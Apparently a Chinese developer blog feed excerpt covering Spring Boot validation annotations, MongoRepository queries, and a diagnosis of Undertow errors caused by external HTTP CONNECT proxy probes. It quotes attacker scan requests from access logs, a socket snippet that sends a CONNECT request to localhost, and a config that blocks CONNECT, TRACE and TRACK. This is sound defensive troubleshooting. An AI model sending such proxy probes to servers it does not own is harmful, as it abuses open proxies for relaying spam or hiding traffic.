<li>@Length(min=, max=)    属性（String）    检查字符串长度是否符合范围    列长度会被设到最大值</li>
<li>@Max(value=)    属性（以 numeric 或者 string 类型来表示一个数字）    检查值是否小于或等于最大值    对列增加一个检查约束</li>
<li>@Min(value=)    属性（以 numeric 或者 string 类型来表示一个数字）    检查值是否大于或等于最小值    对列增加一个检查约束</li>
<li>@NotNull    属性    检查值是否非空（not null）    </li>
<li>@Past    属性（date 或 calendar）    检查日期是否是过去时    对列增加一个检查约束</li>
<li>@Future    属性（date 或 calendar）    检查日期是否是将来时    </li>
<li>@Pattern(regex=”regexp”, flag=)    属性（string）    检查属性是否与给定匹配标志的正则表达式相匹配（见 java.util.regex.Pattern ）    </li>
<li>@Range(min=, max=)    属性（以 numeric 或者 string 类型来表示一个数字）    检查值是否在最小和最大值之间（包括临界值）    对列增加一个检查约束</li>
<li>@Size(min=, max=)    属性（array，collection，map）    检查元素大小是否在最小和最大值之间（包括临界值）</li>
<li>@AssertFalse    属性    检查方法的演算结果是否为 false（对以代码方式而不是注解表示的约束很有用）</li>
<li>@AssertTrue    属性    检查方法的演算结果是否为 true（对以代码方式而不是注解表示的约束很有用）</li>
<li>@Valid        属性（object）    对关联对象递归进行验证。如果对象是集合或数组，就递归地验证其元素；如果对象是 Map，则递归验证其值元素</li>
<li>@Email    属性（String）    检查字符串是否符合有效的 email</li>
</ul>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Size(max = 30, min = 4, message = &quot;密码长度只能在4-30之间&quot;)</span><br><span class="line">private String password;// 密码</span><br><span class="line"></span><br><span class="line">@Pattern(regexp = &quot;^1[35678]\\d&#123;9&#125;$&quot;,message = &quot;手机号格式不正确&quot;)</span><br><span class="line">private String phone;// 电话</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>Springboot JPA MongoDb</title>
    <url>/SpringBoot/Springboot%20JPA%20MongoDb/</url>
    <content><![CDATA[<h3 id="【MongoDB（五）——MongoRepository操作MongoDB】"><a href="#【MongoDB（五）——MongoRepository操作MongoDB】" class="headerlink" title="【MongoDB（五）——MongoRepository操作MongoDB】"></a><a href="https://blog.51cto.com/u_15060545/4043429" target="_blank" rel="noopener">【MongoDB（五）——MongoRepository操作MongoDB】</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//条件查询</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findUserList</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//name = zhangsan and age = 20</span></span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setName(<span class="string">"zhangsan"</span>);</span><br><span class="line">    user.setAge(<span class="number">20</span>);</span><br><span class="line">    Example&lt;User&gt; userExample = Example.of(user);</span><br><span class="line">    List&lt;User&gt; users = userRepository.findAll(userExample);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模糊查询</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findLikeUserList</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//设置模糊查询匹配规则</span></span><br><span class="line">    ExampleMatcher matcher = ExampleMatcher.matching()</span><br><span class="line">            .withStringMatcher(ExampleMatcher.StringMatcher.CONTAINING)</span><br><span class="line">            .withIgnoreCase(<span class="keyword">true</span>);<span class="comment">//忽略大小写</span></span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setName(<span class="string">"z"</span>); <span class="comment">//包含z的数据</span></span><br><span class="line">    Example&lt;User&gt; userExample = Example.of(user,matcher);</span><br><span class="line">    List&lt;User&gt; users = userRepository.findAll(userExample);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findPageUserList</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//分页</span></span><br><span class="line">    Pageable pageable = PageRequest.of(<span class="number">0</span>, <span class="number">3</span>);<span class="comment">//0代表第一页，3显示3个字段</span></span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setName(<span class="string">"zhangsan"</span>);</span><br><span class="line">    Example&lt;User&gt; userExample = Example.of(user);</span><br><span class="line">    Page&lt;User&gt; page = userRepository.findAll(userExample, pageable);</span><br><span class="line">    System.out.println(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="【MONGOREPOSITORY-支持的所有接口】"><a href="#【MONGOREPOSITORY-支持的所有接口】" class="headerlink" title="【MONGOREPOSITORY 支持的所有接口】"></a><a href="https://www.cnblogs.com/vana/p/11171755.html" target="_blank" rel="noopener">【MONGOREPOSITORY 支持的所有接口】</a></h3><p>下面是支持的查询类型，每三条数据分别对应：（方法后缀，方法例子，mongodb原生查询语句）<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">GreaterThan(大于) </span><br><span class="line">findByAgeGreaterThan(int age) </span><br><span class="line">&#123;<span class="attr">"age"</span> : &#123;<span class="attr">"$gt"</span> : age&#125;&#125;</span><br><span class="line"></span><br><span class="line">LessThan（小于） </span><br><span class="line">findByAgeLessThan(int age) </span><br><span class="line">&#123;<span class="attr">"age"</span> : &#123;<span class="attr">"$lt"</span> : age&#125;&#125;</span><br><span class="line"></span><br><span class="line">Between（在...之间） </span><br><span class="line">findByAgeBetween(int from, int to) </span><br><span class="line">&#123;<span class="attr">"age"</span> : &#123;<span class="attr">"$gt"</span> : from, <span class="attr">"$lt"</span> : to&#125;&#125;</span><br><span class="line"></span><br><span class="line">IsNotNull, NotNull（是否非空） </span><br><span class="line">findByFirstnameNotNull() </span><br><span class="line">&#123;<span class="attr">"age"</span> : &#123;<span class="attr">"$ne"</span> : <span class="literal">null</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">IsNull, Null（是否为空） </span><br><span class="line">findByFirstnameNull() </span><br><span class="line">&#123;<span class="attr">"age"</span> : <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line">Like（模糊查询） </span><br><span class="line">findByFirstnameLike(String name) </span><br><span class="line">&#123;"age" : age&#125; ( age as regex)</span><br><span class="line"></span><br><span class="line">(No keyword) findByFirstname(String name) </span><br><span class="line">&#123;<span class="attr">"age"</span> : name&#125;</span><br><span class="line"></span><br><span class="line">Not（不包含） </span><br><span class="line">findByFirstnameNot(String name) </span><br><span class="line">&#123;<span class="attr">"age"</span> : &#123;<span class="attr">"$ne"</span> : name&#125;&#125;</span><br><span class="line"></span><br><span class="line">Near（查询地理位置相近的） </span><br><span class="line">findByLocationNear(Point point) </span><br><span class="line">&#123;<span class="attr">"location"</span> : &#123;<span class="attr">"$near"</span> : [x,y]&#125;&#125;</span><br><span class="line"></span><br><span class="line">Within（在地理位置范围内的） </span><br><span class="line">findByLocationWithin(Circle circle) </span><br><span class="line">&#123;<span class="attr">"location"</span> : &#123;<span class="attr">"$within"</span> : &#123;<span class="attr">"$center"</span> : [ [x, y], distance]&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">Within（在地理位置范围内的） </span><br><span class="line">findByLocationWithin(Box box) </span><br><span class="line">&#123;<span class="attr">"location"</span> : &#123;<span class="attr">"$within"</span> : &#123;<span class="attr">"$box"</span> : [ [x1, y1], x2, y2]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>尽管以上查询功能已经很丰富，但如果还不能满足使用情况的话可以用一下方法—基于mongodb原本查询语句的查询方式。<br>例：在原接口中加入<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Query</span>(<span class="string">"&#123; 'name':&#123;'$regex':?2,'$options':'i'&#125;, sales': &#123;'$gte':?1,'$lte':?2&#125;&#125;"</span>) </span><br><span class="line"><span class="function"><span class="keyword">public</span> Page&lt;Product&gt; <span class="title">findByNameAndAgeRange</span><span class="params">(String name,<span class="keyword">double</span> ageFrom,<span class="keyword">double</span> ageTo,Pageable page)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>注释Query里面的就是mongodb原来的查询语法，我们可以定义传进来的查询参数，通过坐标定义方法的参数。</p>
<p>还可以在后面指定要返回的数据字段，如上面的例子修改如下，则只通过person表里面的name和age字段构建person对象。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Query</span>(value=<span class="string">"&#123; 'name':&#123;'$regex':?2,'$options':'i'&#125;, sales':&#123;'$gte':?1,'$lte':?2&#125;&#125;"</span>,fields=<span class="string">"&#123; 'name' : 1, 'age' : 1&#125;"</span>) </span><br><span class="line"><span class="function"><span class="keyword">public</span> Page&lt;Product&gt; <span class="title">findByNameAndAgeRange</span><span class="params">(String name,<span class="keyword">double</span> ageFrom,<span class="keyword">double</span> ageTo,Pageable page)</span></span>;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
  </entry>
  <entry>
    <title>Undertow request failed HttpServerExchange</title>
    <url>/SpringBoot/Undertow%20request%20failed%20HttpServerExchange/</url>
    <content><![CDATA[<p>部署一个简单的 Springboot Web 项目在阿里云ESC公网，web容器由Tomcat切换为Undertow。</p>
<h3 id="1-异常信息"><a href="#1-异常信息" class="headerlink" title="1. 异常信息"></a>1. 异常信息</h3><p>跑一段时间后，在日志中经常出现一些其他域名相关的奇怪异常，而且很难复现。如下：</p>
<blockquote>
<p>以下只贴出带有域名的异常，其实IP的异常居多</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2021-09-30 09:14:02.935 ERROR 18684 --- [   XNIO-1 I/O-1] io.undertow.request                      :</span><br><span class="line">UT005071: Undertow request failed HttpServerExchange&#123; CONNECT www.baidu.com:443&#125;</span><br><span class="line"></span><br><span class="line">java.lang.IllegalArgumentException: UT000068: Servlet path match failed</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.QueuedNioTcpServer<span class="variable">$1</span>.run(QueuedNioTcpServer.java:129) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2021-10-02 01:57:00.626 ERROR 18684 --- [   XNIO-1 I/O-1] io.undertow.request                      :</span><br><span class="line">UT005071: Undertow request failed HttpServerExchange&#123; GET ab2h&#125;</span><br><span class="line"></span><br><span class="line">java.lang.IllegalArgumentException: UT000068: Servlet path match failed</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:59) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.conduits.ReadReadyHandler<span class="variable">$ChannelListenerHandler</span>.readReady(ReadReadyHandler.java:66) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.NioSocketConduit.handleReady(NioSocketConduit.java:88) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.run(WorkerThread.java:561) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2021-10-10 22:14:39.423 ERROR 18684 --- [   XNIO-1 I/O-1] io.undertow.request                      : </span><br><span class="line">UT005071: Undertow request failed HttpServerExchange&#123; CONNECT www.sogo.com:443&#125;</span><br><span class="line"></span><br><span class="line">java.lang.IllegalArgumentException: UT000068: Servlet path match failed</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.QueuedNioTcpServer<span class="variable">$1</span>.run(QueuedNioTcpServer.java:129) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2021-10-11 19:53:54.083 ERROR 10473 --- [   XNIO-2 I/O-2] io.undertow.request                      : </span><br><span class="line">UT005071: Undertow request failed HttpServerExchange&#123; CONNECT hotmail-com.olc.protection.outlook.com:25&#125;</span><br><span class="line"></span><br><span class="line">java.lang.IllegalArgumentException: UT000068: Servlet path match failed</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatchesData.getServletHandlerByPath(ServletPathMatchesData.java:83) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletPathMatches.getServletHandlerByPath(ServletPathMatches.java:88) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.servlet.handlers.ServletInitialHandler.handleRequest(ServletInitialHandler.java:146) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.handlers.accesslog.AccessLogHandler.handleRequest(AccessLogHandler.java:148) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.handlers.HttpContinueReadHandler.handleRequest(HttpContinueReadHandler.java:65) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEventWithNoRunningRequest(HttpReadListener.java:255) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpReadListener.handleEvent(HttpReadListener.java:136) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:162) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:100) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at io.undertow.server.protocol.http.HttpOpenListener.handleEvent(HttpOpenListener.java:57) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:291) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners<span class="variable">$10</span>.handleEvent(ChannelListeners.java:286) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:92) ~[xnio-api-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.QueuedNioTcpServer<span class="variable">$1</span>.run(QueuedNioTcpServer.java:129) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.safeRun(WorkerThread.java:582) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br><span class="line">	at org.xnio.nio.WorkerThread.run(WorkerThread.java:466) ~[xnio-nio-3.3.8.Final.jar!/:3.3.8.Final]</span><br></pre></td></tr></table></figure>
<p>项目中并没有使用以上域名的API或者SDK，为何会向其发出请求呢？</p>
<h3 id="2-增加容器日志记录"><a href="#2-增加容器日志记录" class="headerlink" title="2. 增加容器日志记录"></a>2. 增加容器日志记录</h3><p>开启Undertow的Access日志：<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">undertow:</span></span><br><span class="line">    <span class="attr">accesslog:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">dir:</span> <span class="string">/var/log/undertow</span></span><br></pre></td></tr></table></figure></p>
<p>观察到以下记录：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">45.61.188.13 - - [11/Oct/2021:22:54:29 +0800] <span class="string">"GET /config/getuser?index=0 HTTP/1.0"</span> 404 295</span><br><span class="line">45.61.188.13 - - [11/Oct/2021:23:30:01 +0800] <span class="string">"POST /boaform/admin/formLogin HTTP/1.1"</span> 404 295</span><br><span class="line">89.248.165.52 - - [11/Oct/2021:19:53:54 +0800] <span class="string">"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1"</span> 500 -</span><br><span class="line">89.248.165.52 - - [11/Oct/2021:21:17:17 +0800] <span class="string">"CONNECT 85.206.160.115:80 HTTP/1.1"</span> 500 -</span><br></pre></td></tr></table></figure></p>
<p>原来这些域名信息都是外部请求带过来的，查询资料发现 <code>CONNECT</code> 是<a href="https://www.jianshu.com/p/54357cdd4736" target="_blank" rel="noopener">【HTTP代理方法】</a>的内容，和 <code>GET</code> 、 <code>POST</code> 是同一个级别的关键词， <code>CONNECT</code>  的作用就是将服务器作为代理。<br> <code>CONNECT</code> 代理完整的报文：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: hotmail-com.olc.protection.outlook.com:25\r\n</span><br><span class="line"><span class="attribute">Proxy-Connection</span>: Keep-Alive\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure></p>
<p>参考<a href="https://www3.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" target="_blank" rel="noopener">【HTTP (HyperText Transfer Protocol)】</a></p>
<ul>
<li>GET: A client can use the GET request to get a web resource from the server.</li>
<li>HEAD: A client can use the HEAD request to get the header that a GET request would have obtained. Since the header contains the last-modified date of the data, this can be used to check against the local cache copy.</li>
<li>POST: Used to post data up to the web server.</li>
<li>PUT: Ask the server to store the data.</li>
<li>DELETE: Ask the server to delete the data.</li>
<li>TRACE: Ask the server to return a diagnostic trace of the actions it takes.</li>
<li>OPTIONS: Ask the server to return the list of request methods it supports.</li>
<li>CONNECT: Used to tell a proxy to make a connection to another host and simply reply the content, without attempting to parse or cache it. This is often used to make SSL connection through the proxy.</li>
<li>Other extension methods.</li>
</ul>
<h3 id="3-复现异常"><a href="#3-复现异常" class="headerlink" title="3. 复现异常"></a>3. 复现异常</h3><p>为了复现以上异常，创建一个 TCP Socket 向 Undertow 服务发送报文即可。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Socket socket = <span class="keyword">new</span> Socket();</span><br><span class="line">    SocketAddress address = <span class="keyword">new</span> InetSocketAddress(<span class="string">"localhost"</span>, <span class="number">8080</span>);</span><br><span class="line">    socket.connect(address, <span class="number">5000</span>);</span><br><span class="line">    socket.setSoTimeout(<span class="number">10000</span>);</span><br><span class="line">    OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">    outputStream.write((<span class="string">"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1\r\n"</span> +</span><br><span class="line">            <span class="string">"Host: hotmail-com.olc.protection.outlook.com\r\n"</span> +</span><br><span class="line">            <span class="string">"Proxy-Connection: Keep-Alive\r\n\r\n"</span>).getBytes());</span><br><span class="line">    outputStream.flush();</span><br><span class="line">    outputStream.close();</span><br><span class="line"></span><br><span class="line">    socket.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="4-消除异常"><a href="#4-消除异常" class="headerlink" title="4. 消除异常"></a>4. 消除异常</h3><p>那么如何禁止外部尝试用我们服务做代理呢？我们想到的是当然是禁止<code>CONNECT</code>这个方法，Springboot给我提供的方法，我们只需要加一个配置即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.undertow.server.HandlerWrapper;</span><br><span class="line"><span class="keyword">import</span> io.undertow.server.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> io.undertow.server.handlers.DisallowedMethodsHandler;</span><br><span class="line"><span class="keyword">import</span> io.undertow.util.HttpString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.undertow.UndertowServletWebServerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UndertowWebServerCustomizerConfig</span> <span class="keyword">implements</span> <span class="title">WebServerFactoryCustomizer</span>&lt;<span class="title">UndertowServletWebServerFactory</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">customize</span><span class="params">(UndertowServletWebServerFactory factory)</span> </span>&#123;</span><br><span class="line">        factory.addDeploymentInfoCustomizers(deploymentInfo -&gt; &#123;</span><br><span class="line">            deploymentInfo.addInitialHandlerChainWrapper(<span class="keyword">new</span> HandlerWrapper() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> HttpHandler <span class="title">wrap</span><span class="params">(HttpHandler handler)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//禁止三个方法TRACE也是不安全的</span></span><br><span class="line">                    System.out.println(<span class="string">"disable HTTP methods: CONNECT/TRACE/TRACK"</span>);</span><br><span class="line">                    HttpString[] disallowedHttpMethods = &#123;</span><br><span class="line">                            HttpString.tryFromString(<span class="string">"CONNECT"</span>),</span><br><span class="line">                            HttpString.tryFromString(<span class="string">"TRACE"</span>),</span><br><span class="line">                            HttpString.tryFromString(<span class="string">"TRACK"</span>)</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> DisallowedMethodsHandler(handler, disallowedHttpMethods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再观察access日志：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [12/Oct/2021:14:38:06 +0800] <span class="string">"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1"</span> 405 -</span><br><span class="line">127.0.0.1 - - [12/Oct/2021:14:38:24 +0800] <span class="string">"CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1"</span> 405 -</span><br></pre></td></tr></table></figure></p>
